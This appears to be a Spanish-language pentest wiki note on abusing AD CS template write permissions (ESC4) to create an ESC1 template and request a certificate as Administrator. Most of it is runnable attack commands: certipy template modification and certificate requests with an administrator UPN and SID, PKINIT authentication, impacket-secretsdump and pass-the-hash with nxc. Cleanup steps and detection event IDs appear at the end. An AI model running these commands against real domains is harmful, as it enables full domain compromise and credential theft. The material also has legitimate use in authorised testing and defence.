---
title: AD CS — ESC4 a ESC1 (tomar una plantilla y pedir como Administrator)
tags: [windows, adcs, esc4, esc1, privesc, kerberos]
---

# AD CS: de ESC4 a ESC1

[🇬🇧 English](adcs-esc4-esc1.en.md) | **Español**

## 1. La idea

**ESC4** es tener permiso de escritura sobre el objeto de una plantilla (`GenericAll`, `WriteDACL`, `WriteProperty`). Eso permite convertir cualquier plantilla en una plantilla **ESC1**: el solicitante elige el `subject`/SAN, y el certificado se emite a nombre de `Administrator`. El certificado resultante sirve para PKINIT y da el hash del Administrador.

## 2. Comprobar el permiso

```bash
certipy find -u '<user>@<domain>' -p '<password>' -dc-ip <DC_IP> -vulnerable -stdout
```

En la plantilla:

```text
[!] ESC4 : User has dangerous permissions on the template
```

Y en los permisos aparecen ACEs de escritura para tu usuario o para un grupo en el que estás (a veces `S-1-5-11`, «Authenticated Users»).

## 3. Convertir la plantilla en ESC1

Antes de tocar nada, guarda el objeto para poder restaurarlo:

```bash
ldapsearch -x -H ldap://<DC_IP> -D '<user>@<domain>' -w '<password>' \
  -b 'CN=<TEMPLATE>,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<tld>' \
  > template-backup.ldif
```

Con `certipy`:

```bash
certipy template -u '<user>@<domain>' -p '<password>' -template '<TEMPLATE>' -write-default-configuration -dc-ip <DC_IP>
```

Eso pone `msPKI-Certificate-Name-Flag` con `ENROLLEE_SUPPLIES_SUBJECT`, quita la aprobación del manager y añade la EKU de autenticación de cliente. Si prefieres hacerlo a mano, los tres cambios son:

- `msPKI-Certificate-Name-Flag = 1` (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Quitar `PEND_ALL_REQUESTS` de `msPKI-Enrollment-Flag`.
- Añadir `1.3.6.1.5.5.7.3.2` (Client Authentication) a `pKIExtendedKeyUsage`.

Y que un principal de bajos privilegios pueda inscribirse: ACE de `Enroll` para `S-1-5-11` o para tu grupo.

## 4. Pedir el certificado como Administrator

```bash
certipy req -u '<user>@<domain>' -p '<password>' -ca '<CA>' -template '<TEMPLATE>' \
  -upn 'administrator@<domain>' -sid 'S-1-5-21-<dominio>-500' -dc-ip <DC_IP>
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

`-sid` importa: sin él, el PAC lleva el SID del usuario real y el acceso puede quedar limitado. Con `-500` el certificado es de Administrator de verdad.

Con el hash o el `ccache`:

```bash
impacket-secretsdump -just-dc-user Administrator '<domain>/<user>@<DC>' -hashes ':<NT_HASH>'
nxc smb <DC> -u Administrator -H '<NT_HASH>' -x 'whoami'
```

## 5. Errores típicos

- **`Certificate template not found`** → el nombre no es el `CN`; con `certipy find` sale el `Template Name`.
- **`The request is not supported`** al pedir → la EKU o la flag no se aplicaron: releer el objeto.
- **`KDC_ERR_CLIENT_NOT_TRUSTED`** → CA no publicada en `NTAuthCertificates`.
- **`KRB_AP_ERR_SKEW`** → reloj; ver [reloj y Kerberos](../general/kerberos-clock.md).
- **El certificado se emite pero `auth` falla con `invalid signature`** → el PFX no incluye la clave o se generó con otra CA.

## 6. Limpieza

Restaura `msPKI-Certificate-Name-Flag`, `msPKI-Enrollment-Flag`, `pKIExtendedKeyUsage` y las ACEs originales del `template-backup.ldif`. Los certificados ya emitidos siguen siendo válidos hasta que caduquen: hay que revocarlos.

## 7. Detección y mitigación

- **4899** (cambio de plantilla) y **5136** sobre `CN=Certificate Templates`.
- **4886/4887** con solicitantes que nunca usaban esa plantilla y `Subject` distinto del `RequesterName`.
- Revisar ACEs peligrosas sobre plantillas (`WriteDACL`, `WriteProperty`, `GenericAll`) para grupos amplios.
- Sacar `Enroll` a `Authenticated Users` de plantillas con `ENROLLEE_SUPPLIES_SUBJECT`; exigir aprobación en las sensibles.
- Auditar `NTAuthCertificates` y las ACL de la CA.

MITRE: T1649, T1558, T1098, T1078.
